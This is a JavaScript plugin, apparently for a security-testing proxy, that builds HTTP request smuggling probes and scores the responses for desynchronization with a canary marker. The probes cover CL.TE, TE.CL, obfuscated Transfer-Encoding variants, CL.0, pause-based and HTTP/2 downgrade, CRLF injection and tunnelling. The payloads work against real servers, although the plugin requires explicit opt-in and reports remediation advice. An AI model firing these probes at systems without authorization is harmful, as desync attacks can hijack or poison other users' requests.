(function () {
  "use strict";

  var B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  function fromBase64(value) {
    var output = "", buffer = 0, bits = 0;
    String(value || "").replace(/=+$/, "").split("").forEach(function (character) {
      var index = B64.indexOf(character); if (index < 0) return;
      buffer = (buffer << 6) | index; bits += 6;
      if (bits >= 8) { bits -= 8; output += String.fromCharCode((buffer >> bits) & 255); }
    });
    return output;
  }
  function toBase64(value) {
    var output = "";
    for (var index = 0; index < value.length; index += 3) {
      var a = value.charCodeAt(index) & 255, hasB = index + 1 < value.length, hasC = index + 2 < value.length;
      var b = hasB ? value.charCodeAt(index + 1) & 255 : 0, c = hasC ? value.charCodeAt(index + 2) & 255 : 0;
      output += B64[a >> 2] + B64[((a & 3) << 4) | (b >> 4)] + (hasB ? B64[((b & 15) << 2) | (c >> 6)] : "=") + (hasC ? B64[c & 63] : "=");
    }
    return output;
  }
  function base(context) {
    var value = context.base_exchange;
    if (!value || !value.exchange_id || !value.url || !value.raw_request_base64) throw new Error("Request Smuggler requires a saved exchange with exact raw request access");
    return value;
  }
  function target(url) {
    var match = String(url).match(/^(https?):\/\/([^/?#]+)([^?#]*)(\?[^#]*)?$/);
    if (!match) throw new Error("target must be HTTP(S)");
    return { url: match[1] + "://" + match[2] + "/", authority: match[2], path: (match[3] || "/") + (match[4] || "") };
  }
  function safePath(value, name) {
    value = String(value || "");
    if (!/^\//.test(value) || /[\r\n]/.test(value) || value.length > 2048) throw new Error(name + " must be a CRLF-free origin-form path");
    return value;
  }
  function inheritedHeaders(exchange, includeAuth) {
    var raw = fromBase64(exchange.raw_request_base64), head = raw.split("\r\n\r\n", 1)[0], output = [];
    head.split("\r\n").slice(1).forEach(function (line) {
      var name = line.split(":", 1)[0].trim().toLowerCase();
      if (!name || /[\r\n]/.test(line) || /^(host|content-length|transfer-encoding|connection|proxy-connection|upgrade|expect|te)$/.test(name)) return;
      if (!includeAuth && /^(authorization|cookie|proxy-authorization)$/.test(name)) return;
      output.push(line);
    });
    return output.slice(0, 64);
  }
  function message(method, path, authority, inherited, extra, body, close) {
    var lines = [method + " " + path + " HTTP/1.1", "Host: " + authority];
    inherited.forEach(function (line) { lines.push(line); });
    if (!inherited.some(function (line) { return /^user-agent\s*:/i.test(line); })) lines.push("User-Agent: HuntProxy-Request-Smuggler/1.1");
    extra.forEach(function (line) { lines.push(line); });
    lines.push("Connection: " + (close ? "close" : "keep-alive"));
    return lines.join("\r\n") + "\r\n\r\n" + (body || "");
  }
  function normalGet(path, parsed, inherited, close) { return message("GET", path, parsed.authority, inherited, [], "", close); }
  function clTe(parsed, path, canaryPath, inherited, marker, transferLines) {
    var prefix = "GET " + canaryPath + " HTTP/1.1\r\nX-HuntProxy-Desync: " + marker;
    var body = "0\r\n\r\n" + prefix;
    return message("POST", path, parsed.authority, inherited, ["Content-Length: " + body.length].concat(transferLines), body, false) + normalGet(path, parsed, inherited, true);
  }
  function teCl(parsed, path, canaryPath, inherited, marker, transferLines) {
    var smuggled = "POST " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority + "\r\nX-HuntProxy-Desync: " + marker + "\r\nContent-Type: text/plain\r\nContent-Length: 15\r\n\r\n";
    var size = smuggled.length.toString(16), body = size + "\r\n" + smuggled + "\r\n0\r\n\r\n";
    return message("POST", path, parsed.authority, inherited, ["Content-Length: " + (size.length + 2)].concat(transferLines), body, false);
  }
  function clZero(parsed, path, canaryPath, inherited, marker) {
    var smuggled = "GET " + canaryPath + " HTTP/1.1\r\nX-HuntProxy-Desync: " + marker;
    return message("POST", path, parsed.authority, inherited, ["Content-Length: " + smuggled.length, "Content-Type: text/plain"], smuggled, false) + normalGet(path, parsed, inherited, true);
  }
  function malformedMethod(path, parsed, inherited, marker) {
    return message("XGET", path, parsed.authority, inherited, ["X-HuntProxy-Desync: " + marker], "", true);
  }
  function zeroCl(parsed, path, inherited, marker) {
    return message("GET", path, parsed.authority, inherited, ["Content-Length : 1", "X-HuntProxy-Desync: " + marker], "", false);
  }
  function withHost(path, parsed, inherited, host, close) {
    var lines = ["GET " + path + " HTTP/1.1", "Host: " + host];
    inherited.forEach(function (line) { lines.push(line); });
    lines.push("Connection: " + (close ? "close" : "keep-alive"));
    return lines.join("\r\n") + "\r\n\r\n";
  }
  function h2Headers(parsed, method, path, inherited, extras) {
    var fields = [
      { name: ":method", value: method },
      { name: ":scheme", value: "https" },
      { name: ":authority", value: parsed.authority },
      { name: ":path", value: path },
      { name: "user-agent", value: "HuntProxy-Request-Smuggler/1.2" }
    ];
    (inherited || []).forEach(function(line){var split=line.indexOf(":");if(split>0)fields.push({name:line.slice(0,split).trim().toLowerCase(),value:line.slice(split+1).trim()});});
    return fields.concat(extras || []);
  }
  function h2Probe(parsed, path, canaryPath, inherited, marker, variant) {
    var prefix = "GET " + canaryPath + " HTTP/1.1\r\nX-HuntProxy-Desync: " + marker;
    if (variant === "h2_cl") return { headers: h2Headers(parsed, "POST", path, inherited, [{ name: "content-length", value: "0" }]), body: prefix };
    if (variant === "h2_te") return { headers: h2Headers(parsed, "POST", path, inherited, [{ name: "transfer-encoding", value: "chunked" }]), body: "0\r\n\r\n" + prefix };
    if (variant === "h2_crlf") return { headers: h2Headers(parsed, "POST", path, inherited, [{ name: "x-huntproxy", value: "probe\r\nTransfer-Encoding: chunked" }]), body: "0\r\n\r\n" + prefix };
    if (variant === "h2_split") return { headers: h2Headers(parsed, "GET", path, inherited, [{ name: "x-huntproxy", value: "probe\r\n\r\nGET " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority }]), body: "" };
    if (variant === "h2_tunnel_name") return { headers: h2Headers(parsed, "HEAD", "/login", inherited, [{ name: "x: y\r\n\r\nGET " + canaryPath + " HTTP/1.1\r\nHost", value: parsed.authority + "\r\nX-HuntProxy-Desync: " + marker + "\r\n\r\n" }]), body: "" };
    return { headers: [
      { name: ":method", value: "HEAD" },
      { name: ":scheme", value: "https" },
      { name: ":authority", value: parsed.authority },
      { name: ":path", value: "/login HTTP/1.1\r\nHost: " + parsed.authority + "\r\n\r\nGET " + canaryPath + " HTTP/1.1\r\nX-HuntProxy-Desync: " + marker }
    ], body: "" };
  }
  function pauseProbe(parsed, path, canaryPath, inherited, marker) {
    var smuggled="GET "+canaryPath+" HTTP/1.1\r\nHost: "+parsed.authority+"\r\nX-HuntProxy-Desync: "+marker+"\r\n\r\n";
    var first=message("POST",path,parsed.authority,inherited,["Content-Length: "+smuggled.length,"Content-Type: application/x-www-form-urlencoded"],smuggled,false);
    return { bytes:first+first, split:first.indexOf("\r\n\r\n")+4 };
  }
  function techniques(input, context) {
    var exchange = base(context), parsed = target(exchange.url), inherited = inheritedHeaders(exchange, input.include_auth === true), marker = String(input.marker).toLowerCase();
    var path = safePath(input.probe_path || parsed.path, "probe_path");
    var canaryPath = safePath(input.canary_path || ("/hp-" + marker + "-not-found"), "canary_path");
    var items = [];
    function add(family, name, request, confirmable, polarity, mode) { items.push({ family: family, name: name, request: request, confirmable: confirmable, polarity: polarity || family, mode: mode || "pipeline" }); }
    add("cl_te", "canonical CL.TE", clTe(parsed, path, canaryPath, inherited, marker, ["Transfer-Encoding: chunked"]), true);
    add("te_cl", "canonical TE.CL", teCl(parsed, path, canaryPath, inherited, marker, ["Transfer-Encoding: chunked"]), true);
    var permutations = [
      ["tab-separated value", ["Transfer-Encoding:\tchunked"]],
      ["mixed-case name", ["TrAnSfEr-EnCoDiNg: chunked"]],
      ["comma list", ["Transfer-Encoding: gzip, chunked"]],
      ["invalid then valid duplicate", ["Transfer-Encoding: x", "Transfer-Encoding: chunked"]],
      ["valid then invalid duplicate", ["Transfer-Encoding: chunked", "Transfer-Encoding: x"]],
      ["whitespace before colon", ["Transfer-Encoding : chunked"]]
    ];
    permutations.forEach(function (permutation) {
      add("te_te", "TE.TE " + permutation[0] + " (CL.TE oracle)", clTe(parsed, path, canaryPath, inherited, marker, permutation[1]), true, "cl_te");
      add("te_te", "TE.TE " + permutation[0] + " (TE.CL oracle)", teCl(parsed, path, canaryPath, inherited, marker, permutation[1]), true, "te_cl");
    });
    add("cl_0", "CL.0 marker pipeline", clZero(parsed, path, canaryPath, inherited, marker), true);
    var body = "12345";
    add("0_cl", "0.CL early-response confirmation", zeroCl(parsed, path, inherited, marker), true, "0_cl", "zero_cl_pair");
    var connectionHost = String(input.connection_state_host || (marker + "." + parsed.authority));
    if (!connectionHost || /[\r\n\s]/.test(connectionHost) || connectionHost.length > 255) throw new Error("connection_state_host must be a CRLF-free Host value");
    var connectionPath = safePath(input.connection_state_path || path, "connection_state_path");
    add("connection_state", "second-request Host validation", withHost(connectionPath, parsed, inherited, connectionHost, true), true, "connection_state", "connection_state");
    add("h2_cl", "H2.CL downgrade", h2Probe(parsed, path, canaryPath, inherited, marker, "h2_cl"), true, "h2_cl", "h2");
    add("h2_te", "H2.TE downgrade / response queue", h2Probe(parsed, path, canaryPath, inherited, marker, "h2_te"), true, "h2_te", "h2");
    add("h2_crlf", "H2 CRLF Transfer-Encoding injection", h2Probe(parsed, path, canaryPath, inherited, marker, "h2_crlf"), true, "h2_te", "h2");
    add("h2_split", "H2 CRLF request splitting", h2Probe(parsed, path, canaryPath, inherited, marker, "h2_split"), true, "h2_split", "h2");
    add("h2_tunnel", "H2 header-name request tunnelling", h2Probe(parsed, path, canaryPath, inherited, marker, "h2_tunnel_name"), false, "h2_tunnel", "h2_tunnel");
    add("h2_tunnel", "H2 pseudo-path request tunnelling", h2Probe(parsed, path, canaryPath, inherited, marker, "h2_tunnel_path"), false, "h2_tunnel", "h2_tunnel");
    add("pause", "server-side pause-based CL.0", pauseProbe(parsed,path,canaryPath,inherited,marker), true, "pause", "pause");
    add("parser_discrepancy", "conflicting duplicate Content-Length", message("POST", path, parsed.authority, inherited, ["Content-Length: 4", "Content-Length: 5", "Content-Type: text/plain"], "12345", false) + normalGet(path, parsed, inherited, true), false);
    add("parser_discrepancy", "signed Content-Length", message("POST", path, parsed.authority, inherited, ["Content-Length: +5", "Content-Type: text/plain"], "12345", false) + normalGet(path, parsed, inherited, true), false);
    var selected = input.families && input.families.length ? input.families : ["cl_te", "te_cl", "te_te", "cl_0", "0_cl", "connection_state", "h2_cl", "h2_te", "h2_crlf", "h2_split", "h2_tunnel", "parser_discrepancy"];
    return { parsed: parsed, inherited: inherited, path: path, canary_path: canaryPath, connection_host: connectionHost, connection_path: connectionPath, items: items.filter(function (item) { return selected.indexOf(item.family) !== -1; }).slice(0, Math.max(1, Math.min(Number(input.max_techniques || 30), 30))) };
  }
  function options(input) {
    return { response_mode: "until_idle", read_timeout_ms: Math.max(1000, Math.min(Number(input.read_timeout_ms || 8000), 30000)), idle_timeout_ms: Math.max(500, Math.min(Number(input.idle_timeout_ms || 1500), 5000)), half_close_write: false };
  }
  function raw(id, parsed, request, input) { return { id: id, type: "raw_http1", target_url: parsed.url, request_base64: toBase64(request), use_project_cookies: false, options: options(input) }; }
  function rawH2(id, parsed, request, input) { return { id: id, type: "raw_http2", target_url: parsed.url, streams: [{ id: id + "-stream", headers: request.headers, body_text: request.body }], options: { timeout_ms: Math.max(1000, Math.min(Number(input.read_timeout_ms || 8000), 30000)), final_data_together: false } }; }
  function rawPause(id,parsed,request,input){return {id:id,type:"raw_http1",target_url:parsed.url,request_base64:toBase64(request.bytes),use_project_cookies:false,options:{pause_at_byte:request.split,pause_ms:Math.max(1,Math.min(Number(input.pause_ms||61000),120000)),await_response_before_continue:input.pause_await_response===true,half_close_write:false,response_mode:"until_idle",read_timeout_ms:Math.max(1000,Math.min(Number(input.read_timeout_ms||30000),120000)),idle_timeout_ms:Math.max(500,Math.min(Number(input.idle_timeout_ms||1500),5000))}};}
  function plan(input, context) {
    if (input.confirm_intrusive !== true) throw new Error("desynchronization testing requires confirm_intrusive=true");
    if (!/^[a-z0-9]{8,32}$/i.test(String(input.marker || ""))) throw new Error("marker must be a unique 8-32 character alphanumeric value");
    var set = techniques(input, context), repeats = Math.max(3, Math.min(Number(input.repeats || 5), 5)), operations = [];
    for (var direct = 0; direct < 2; direct += 1) {
      operations.push(raw("direct-base-" + direct, set.parsed, normalGet(set.path, set.parsed, set.inherited, true), input));
      operations.push(raw("direct-canary-" + direct, set.parsed, normalGet(set.canary_path, set.parsed, set.inherited, true), input));
    }
    if (set.items.some(function (item) { return item.mode === "h2" || item.mode === "h2_tunnel"; })) {
      for (var h2Direct = 0; h2Direct < 2; h2Direct += 1) {
        operations.push(rawH2("h2-direct-base-" + h2Direct, set.parsed, { headers: h2Headers(set.parsed, "GET", set.path, set.inherited), body: "" }, input));
        operations.push(rawH2("h2-direct-canary-" + h2Direct, set.parsed, { headers: h2Headers(set.parsed, "GET", set.canary_path, set.inherited), body: "" }, input));
      }
    }
    set.items.forEach(function (technique, index) {
      for (var repeat = 0; repeat < repeats; repeat += 1) {
        var clean = normalGet(set.path, set.parsed, set.inherited, true), control = clean, victim = clean, probe = technique.request;
        if (technique.mode === "zero_cl_pair") {
          control = malformedMethod(set.path, set.parsed, set.inherited, String(input.marker));
          victim = control;
        } else if (technique.mode === "connection_state") {
          control = technique.request;
          probe = normalGet(set.path, set.parsed, set.inherited, false) + withHost(set.connection_path, set.parsed, set.inherited, set.connection_host, true);
        }
        if(technique.mode==="pause"){
          operations.push(raw("control-"+index+"-"+repeat,set.parsed,control,input));
          operations.push(rawPause("probe-"+index+"-"+repeat,set.parsed,probe,input));
          operations.push(raw("victim-"+index+"-"+repeat,set.parsed,victim,input));
          operations.push(raw("recovery-"+index+"-"+repeat,set.parsed,clean,input));
        } else if (technique.mode === "h2" || technique.mode === "h2_tunnel") {
          operations.push(rawH2("control-" + index + "-" + repeat, set.parsed, { headers: h2Headers(set.parsed, "GET", set.path, set.inherited), body: "" }, input));
          operations.push(rawH2("probe-" + index + "-" + repeat, set.parsed, probe, input));
          operations.push(rawH2("victim-" + index + "-" + repeat, set.parsed, { headers: h2Headers(set.parsed, "GET", set.path, set.inherited), body: "" }, input));
          operations.push(rawH2("recovery-" + index + "-" + repeat, set.parsed, { headers: h2Headers(set.parsed, "GET", set.path, set.inherited), body: "" }, input));
        } else {
          operations.push(raw("control-" + index + "-" + repeat, set.parsed, control, input));
          operations.push(raw("probe-" + index + "-" + repeat, set.parsed, probe, input));
          operations.push(raw("victim-" + index + "-" + repeat, set.parsed, victim, input));
          operations.push(raw("recovery-" + index + "-" + repeat, set.parsed, clean, input));
        }
      }
    });
    return { operations: operations, result: { repeats: repeats, auth_included: input.include_auth === true, canary_path: set.canary_path, request_count: operations.length, techniques: set.items.map(function (item) { return { family: item.family, name: item.name, polarity: item.polarity, canary_confirmation: item.confirmable }; }), limitations: ["HTTP/2 families require HTTPS with ALPN h2 and never fall back to HTTP/1", "Pause-based probing is opt-in because each cycle may hold a connection for up to pause_ms", "Browser client-side desync requires a real browser workflow", "Authentication is excluded unless include_auth=true"] } };
  }
  function byId(observations) { var output = {}; observations.forEach(function (item) { output[item.id] = item; }); return output; }
  function rawResult(item) { return item && !item.error && item.raw ? item.raw : null; }
  function hasResult(item) { return !!rawResult(item) || !!(item && !item.error && Array.isArray(item.streams)); }
  function outcome(item) { var value = rawResult(item); if (value) return String(value.read_outcome || "missing"); if (item && Array.isArray(item.streams)) return item.timed_out ? "timeout" : "idle"; return "error"; }
  function transcript(item) { var value = rawResult(item); return value ? fromBase64(value.response_transcript_base64 || value.response_base64 || "") : ""; }
  function segments(item) {
    if (item && Array.isArray(item.streams)) return item.streams.map(function (stream) { var encoded=String(stream.response_body_base64||"");return { status: stream.status_code || null, text: item.id&&item.id.indexOf("probe-")===0?fromBase64(encoded.slice(0,87384)):"", hash:stream.response_body_hash||"", length:stream.response_length==null?0:Number(stream.response_length) }; });
    var value = rawResult(item), bytes = transcript(item); if (!value) return [];
    return (value.responses || []).map(function (response) { return { status: response.status_code || null, text: bytes.slice(response.offset, response.offset + response.length) }; });
  }
  function normalized(value) { value = String(value || ""); if (value.length > 32768) value = value.slice(0, 16384) + value.slice(-16384); return value.toLowerCase().replace(/^(date|set-cookie|x-request-id|traceparent):.*$/gmi, "").replace(/\b[0-9a-f]{8}-[0-9a-f-]{27,}\b/gi, "<id>").replace(/\b\d{10,13}\b/g, "<time>").replace(/\s+/g, " ").trim(); }
  function similarity(left, right) {
    left = normalized(left); right = normalized(right); if (left === right) return 1; if (!left || !right) return 0;
    var a = {}, b = {}, union = {}, same = 0, total = 0;
    left.split(/[^a-z0-9_<>]+/).filter(Boolean).forEach(function (token) { a[token] = 1; union[token] = 1; });
    right.split(/[^a-z0-9_<>]+/).filter(Boolean).forEach(function (token) { b[token] = 1; union[token] = 1; });
    Object.keys(union).forEach(function (token) { total += 1; if (a[token] && b[token]) same += 1; }); return total ? same / total : 0;
  }
  function sameSegment(left, right) { if(!left||!right||left.status!==right.status)return false;if(left.hash&&right.hash)return left.hash===right.hash;if(left.length!=null&&right.length!=null&&left.length===right.length&&!left.text&&!right.text)return true;return similarity(left.text,right.text)>=0.9; }
  function stable(left, right) {
    var a = segments(left), b = segments(right); if (!hasResult(left) || !hasResult(right) || outcome(left) !== outcome(right) || a.length !== b.length) return false;
    for (var index = 0; index < a.length; index += 1) {
      if (a[index].status !== b[index].status) return false;
      var longest = Math.max(a[index].text.length, b[index].text.length, 1), shortest = Math.min(a[index].text.length, b[index].text.length);
      if (!sameSegment(a[index], b[index]) && shortest / longest < 0.9) return false;
    }
    return true;
  }
  function matchesCanary(segment, canary, base) { return !!(segment && canary && base && (canary.status !== base.status ? segment.status === canary.status : sameSegment(segment, canary))); }
  function matchesBase(segment, base) { if (!segment || !base || segment.status !== base.status) return false; var longest=Math.max(segment.text.length,base.text.length,1),shortest=Math.min(segment.text.length,base.text.length);return shortest/longest>=0.9||sameSegment(segment,base); }
  function evidence(items) { var output=[]; items.forEach(function(item){var value=rawResult(item);if(value&&value.exchange_id)output.push(value.exchange_id);if(item&&Array.isArray(item.streams))item.streams.forEach(function(stream){if(stream.exchange_id)output.push(stream.exchange_id);});});return output; }
  function analyze(input, observations, context) {
    var map = byId(observations), set = techniques(input, context), repeats = Math.max(3, Math.min(Number(input.repeats || 5), 5)), findings = [], diagnostics = [];
    var hasH2=set.items.some(function(item){return item.mode==="h2"||item.mode==="h2_tunnel";});
    var h1BaseDirect=[map["direct-base-0"],map["direct-base-1"]],h1CanaryDirect=[map["direct-canary-0"],map["direct-canary-1"]];
    var h2BaseDirect=[map["h2-direct-base-0"],map["h2-direct-base-1"]],h2CanaryDirect=[map["h2-direct-canary-0"],map["h2-direct-canary-1"]];
    var h1Stable=stable(h1BaseDirect[0],h1BaseDirect[1])&&stable(h1CanaryDirect[0],h1CanaryDirect[1]);
    var h2Stable=!hasH2||(stable(h2BaseDirect[0],h2BaseDirect[1])&&stable(h2CanaryDirect[0],h2CanaryDirect[1]));
    var threshold = Math.max(3, Math.ceil(repeats * 0.6));
    set.items.forEach(function (technique, index) {
      var h2Mode=technique.mode==="h2"||technique.mode==="h2_tunnel",baseDirect=h2Mode?h2BaseDirect:h1BaseDirect,canaryDirect=h2Mode?h2CanaryDirect:h1CanaryDirect;
      var directStable=h2Mode?h2Stable:h1Stable,baseSignature=segments(baseDirect[0])[0],canarySignature=segments(canaryDirect[0])[0];
      var canaryDistinct=directStable&&baseSignature&&canarySignature&&(baseSignature.status!==canarySignature.status||!sameSegment(baseSignature,canarySignature));
      var controls = [], probes = [], victims = [], recoveries = [], clean = 0, contaminated = 0, divergentVictims = 0, timeouts = 0;
      for (var repeat = 0; repeat < repeats; repeat += 1) {
        var control = map["control-" + index + "-" + repeat], probe = map["probe-" + index + "-" + repeat], victim=map["victim-"+index+"-"+repeat], recovery=map["recovery-"+index+"-"+repeat]; controls.push(control); probes.push(probe); victims.push(victim); recoveries.push(recovery);
        var controlSegments = segments(control); if (hasResult(control) && outcome(control) !== "timeout" && controlSegments.length >= 1 && controlSegments.every(function (segment) { return !canaryDistinct || !matchesCanary(segment, canarySignature, baseSignature); })) clean += 1;
        var probeSegments=segments(probe), victimSegments=segments(victim), recoverySegments=segments(recovery), downstream=probeSegments.concat(victimSegments,recoverySegments);
        if (technique.mode === "zero_cl_pair") {
          var mutantControl=segments(control)[0], mutantVictim=victimSegments[0];
          if (mutantControl && mutantVictim && !matchesBase(mutantControl,baseSignature) && matchesBase(mutantVictim,baseSignature)) contaminated += 1;
        } else if (technique.mode === "connection_state") {
          var directHost=segments(control)[0], indirectHost=probeSegments.length > 1 ? probeSegments[probeSegments.length-1] : null;
          if (directHost && indirectHost && directHost.status !== indirectHost.status && matchesBase(probeSegments[0],baseSignature)) contaminated += 1;
        } else if (technique.confirmable && canaryDistinct && downstream.some(function (segment) { return matchesCanary(segment, canarySignature, baseSignature) && !sameSegment(segment, baseSignature); })) contaminated += 1;
        if (technique.mode === "h2_tunnel" && probeSegments.some(function(segment){return /HTTP\/1\.[01]\s+[1-5][0-9][0-9]/i.test(segment.text);})) contaminated += 1;
        var victimFirst=segments(victim)[0],recoveryFirst=segments(recovery)[0]; if((victimFirst&&!matchesBase(victimFirst,baseSignature))||(recoveryFirst&&!matchesBase(recoveryFirst,baseSignature))) divergentVictims+=1;
        if (outcome(probe) === "timeout" && outcome(control) !== "timeout") timeouts += 1;
      }
      var confirmed = directStable && canaryDistinct && clean === repeats && contaminated >= threshold;
      var candidate = directStable && clean === repeats && timeouts >= threshold;
      var responseCandidate=directStable&&clean===repeats&&divergentVictims>=threshold;
      diagnostics.push({ family: technique.family, technique: technique.name, polarity: technique.polarity, clean_controls: clean, canary_confirmations: contaminated, divergent_victims: divergentVictims, probe_only_timeouts: timeouts, repeats: repeats, signal: confirmed ? "marker_contamination" : responseCandidate ? "victim_divergence" : candidate ? "timing_candidate" : "none" });
      if (confirmed) findings.push({
        title: "Confirmed " + (h2Mode ? "HTTP/2 downgrade/tunnelling" : "HTTP/1 request desynchronization") + ": " + technique.name, severity: "high", confidence: "firm",
        explanation: (technique.mode === "h2_tunnel" ? "A nested HTTP/1 response was reproducibly exposed inside the HTTP/2 response body" : "A harmless marker request was reproducibly parsed out of the ambiguous pipeline") + " in " + contaminated + " of " + repeats + " attempts, while every interleaved clean pipeline remained uncontaminated.",
        remediation: "Reject ambiguous framing at the first hop, normalize Transfer-Encoding and Content-Length consistently across every hop, and close connections after parser errors.",
        evidence_exchange_ids: evidence(baseDirect.concat(canaryDirect, controls, probes, victims, recoveries)), metadata: { family: technique.family, polarity: technique.polarity, signal: "marker_contamination", confirmations: contaminated, attempts: repeats }
      });
      else if (responseCandidate||candidate) findings.push({
        title: (h2Mode ? "HTTP/2 downgrade" : "HTTP/1 framing") + " discrepancy candidate: " + technique.name, severity: "medium", confidence: "tentative",
        explanation: responseCandidate ? "Requests immediately following the ambiguous probe diverged from the stable baseline in " + divergentVictims + " of " + repeats + " attempts while every interleaved pre-probe control remained clean. Marker confirmation is still required before treating this as exploitable." : "The ambiguous request timed out in " + timeouts + " of " + repeats + " attempts while all interleaved controls completed. Timing alone is not proof of desynchronization, so marker confirmation or manual validation is required.",
        remediation: "Review every HTTP hop for inconsistent framing rules and validate on an isolated connection before treating this as exploitable.",
        evidence_exchange_ids: evidence(controls.concat(probes,victims,recoveries)), metadata: { family: technique.family, polarity: technique.polarity, signal: responseCandidate?"victim_divergence":"timing_candidate", attempts: repeats }
      });
    });
    return { findings: findings, result: { direct_controls_stable: h1Stable && h2Stable, diagnostics: diagnostics, limitations: ["Firm framing findings require repeated downstream marker contamination; timeout-only signals remain tentative.", "HTTP/2 probes require HTTPS with ALPN h2 and never fall back to HTTP/1.", "Pause-based findings require the explicit pause family; browser client-side desync remains out of scope."] } };
  }
  globalThis.HuntProxyPlugin = { plan: plan, analyze: analyze };
}());
